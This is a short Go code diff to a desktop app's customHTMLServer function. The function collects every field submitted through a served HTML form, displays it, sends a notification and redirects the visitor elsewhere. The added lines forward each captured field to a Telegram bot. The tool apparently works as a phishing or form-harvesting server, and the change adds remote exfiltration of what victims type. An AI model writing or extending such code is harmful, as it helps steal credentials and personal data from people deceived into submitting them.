@@ -88,8 +88,12 @@ func customHTMLServer(win fyne.Window, textGrid *widget.TextGrid, html, redirect
 		valueStr := request.Form.Encode()
 		for _, eleman := range strings.Split(valueStr, "&") {
 			*textStream += strings.Replace(eleman, "=", "  :  ", -1) + "\n"
+			if useTelegramBot {
+				tg.send(eleman)
+			}
 		}
 		textGrid.SetText(*textStream)
+
 		notiApp.SendNotification(fyne.NewNotification("New Form", valueStr))
 		http.Redirect(response, request, redirectURL, 301)
 	}
